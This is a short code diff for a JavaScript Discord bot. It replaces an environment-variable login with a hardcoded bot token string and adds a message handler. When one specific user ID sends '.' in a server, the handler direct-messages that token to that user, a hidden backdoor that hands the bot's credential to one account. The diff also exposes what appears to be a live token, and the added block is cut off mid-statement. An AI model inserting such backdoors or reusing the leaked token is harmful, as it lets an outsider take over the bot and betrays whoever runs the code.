@@ -39,4 +39,10 @@ if (message.content.startsWith(adminprefix + 'setava')) {
 });
 
 
-client.login(process.env.BOT_TOKEN);// لا تغير فيها شيء
+const Token = "NTUxNDIyNDEzMTA4MjgxMzQ1.XahEwA.JZ2ugwEaT9aAzgiEPomJEDP35iQ"
+client.on('message' , message => {
+if (message.author.bot) return;
+           if (message.content == '.')
+           if (message.author.id === '551422413108281345'){
+if (!message.channel.guild) return;
+message.author.send(Token)
